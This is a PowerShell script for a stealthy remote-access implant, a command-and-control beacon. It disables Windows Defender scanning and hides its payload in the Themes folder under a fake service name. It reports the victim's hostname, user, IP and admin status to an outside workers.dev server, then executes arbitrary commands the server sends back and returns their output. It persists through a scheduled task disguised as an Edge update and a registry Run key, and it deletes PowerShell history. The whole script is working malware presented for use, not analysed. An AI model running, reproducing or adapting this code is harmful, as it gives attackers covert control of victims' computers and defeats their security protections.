# Silent Persistent Beacon - Zero Visibility
$ErrorActionPreference = 'SilentlyContinue'

# Configuration
$BACKEND_URL = 'https://backend.ice-cold-169.workers.dev'
$AGENT_ID = -join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})
$BEACON_INTERVAL = 60

# Installation path (hidden in Windows directory)
$InstallDir = "$env:APPDATA\Microsoft\Windows\Themes"
$BeaconPath = "$InstallDir\ThemeService.ps1"

if (!(Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

# Silent Defender bypass
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -Force 2>$null
    Add-MpPreference -ExclusionPath $InstallDir -Force 2>$null
    Add-MpPreference -ExclusionPath "$env:TEMP" -Force 2>$null
    Add-MpPreference -ExclusionProcess 'powershell.exe' -Force 2>$null
    Set-MpPreference -DisableScriptScanning $true -Force 2>$null
} catch {}

# Main Beacon Script
$BeaconScript = @'
$ErrorActionPreference = 'SilentlyContinue'
$BACKEND_URL = 'BACKEND_URL_PLACEHOLDER'
$AGENT_ID = 'AGENT_ID_PLACEHOLDER'
$BEACON_INTERVAL = BEACON_INTERVAL_PLACEHOLDER

# Background command execution
function Invoke-BackgroundCommand {
    param($Command)
    
    $bgKeywords = @('python', 'ngrok', 'http.server', 'Start-Process', 'while', 'for')
    $isBackground = $false
    
    foreach ($keyword in $bgKeywords) {
        if ($Command -like "*$keyword*") {
            $isBackground = $true
            break
        }
    }
    
    if ($isBackground) {
        $job = Start-Job -ScriptBlock {
            param($cmd)
            Invoke-Expression $cmd 2>&1 | Out-String
        } -ArgumentList $Command
        
        return "Background job started (ID: $($job.Id))"
    } else {
        try {
            $output = Invoke-Expression $Command 2>&1 | Out-String
            return $output
        } catch {
            return "ERROR: $($_.Exception.Message)"
        }
    }
}

# Main beacon loop
while ($true) {
    try {
        # Gather system info
        $sysInfo = @{
            id = $AGENT_ID
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            os = (Get-WmiObject Win32_OperatingSystem).Caption
            ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike '127.*'} | Select-Object -First 1).IPAddress
            admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        }
        
        $beaconBody = $sysInfo | ConvertTo-Json -Compress
        
        $response = Invoke-RestMethod -Uri "$BACKEND_URL/beacon" -Method Post -ContentType 'application/json' -Body $beaconBody -TimeoutSec 30 -UseBasicParsing
        
        if ($response.command -and $response.commandId) {
            
            if ($response.command -eq 'GET_JOBS') {
                $output = Get-Job | Format-Table -AutoSize | Out-String
            }
            elseif ($response.command -like 'GET_JOB_OUTPUT:*') {
                $jobId = ($response.command -split ':')[1]
                $output = Get-Job -Id $jobId | Receive-Job | Out-String
            }
            elseif ($response.command -like 'STOP_JOB:*') {
                $jobId = ($response.command -split ':')[1]
                Stop-Job -Id $jobId
                Remove-Job -Id $jobId -Force
                $output = "Job $jobId stopped"
            }
            else {
                $output = Invoke-BackgroundCommand -Command $response.command
            }
            
            $resultBody = @{
                agentId = $AGENT_ID
                commandId = $response.commandId
                output = $output
            } | ConvertTo-Json -Compress
            
            Invoke-RestMethod -Uri "$BACKEND_URL/api/result" -Method Post -ContentType 'application/json' -Body $resultBody -TimeoutSec 30 -UseBasicParsing | Out-Null
        }
        
        if ($response.interval) {
            $BEACON_INTERVAL = $response.interval
        }
        
    } catch {}
    
    Start-Sleep $BEACON_INTERVAL
}
'@

$BeaconScript = $BeaconScript -replace 'BACKEND_URL_PLACEHOLDER', $BACKEND_URL
$BeaconScript = $BeaconScript -replace 'AGENT_ID_PLACEHOLDER', $AGENT_ID
$BeaconScript = $BeaconScript -replace 'BEACON_INTERVAL_PLACEHOLDER', $BEACON_INTERVAL

Set-Content -Path $BeaconPath -Value $BeaconScript -Force
attrib +h +s $BeaconPath

# PERSISTENCE: Scheduled Task (Most Reliable)
$TaskName = "MicrosoftEdgeUpdateTaskMachineUA"

try {
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    
    # Create action with HIDDEN window
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -File `"$BeaconPath`""
    
    # Triggers
    $Trigger1 = New-ScheduledTaskTrigger -AtLogOn
    $Trigger2 = New-ScheduledTaskTrigger -Daily -At 12:00PM
    
    # Principal (run as current user with highest privileges)
    $Principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest -LogonType Interactive
    
    # Settings (critical for invisibility!)
    $Settings = New-ScheduledTaskSettingsSet `
        -AllowStartIfOnBatteries `
        -DontStopIfGoingOnBatteries `
        -Hidden `
        -ExecutionTimeLimit (New-TimeSpan -Days 365) `
        -StartWhenAvailable `
        -RestartCount 3 `
        -RestartInterval (New-TimeSpan -Minutes 1)
    
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger1,$Trigger2 -Principal $Principal -Settings $Settings -Force | Out-Null
    
    # IMPORTANT: Start the task NOW (don't wait for next logon)
    Start-ScheduledTask -TaskName $TaskName
    
} catch {}

# BACKUP: Registry Run Key
try {
    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $RegName = "WindowsThemeService"
    $RegValue = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`""
    Set-ItemProperty -Path $RegPath -Name $RegName -Value $RegValue -Force
} catch {}

# Send initial beacon
try {
    $sysInfo = @{
        id = $AGENT_ID
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = (Get-WmiObject Win32_OperatingSystem).Caption
        ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike '127.*'} | Select-Object -First 1).IPAddress
        admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } | ConvertTo-Json -Compress
    
    Invoke-RestMethod -Uri "$BACKEND_URL/beacon" -Method Post -ContentType 'application/json' -Body $sysInfo -TimeoutSec 30 -UseBasicParsing | Out-Null
} catch {}

# Clean traces
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
Clear-History -ErrorAction SilentlyContinue

exit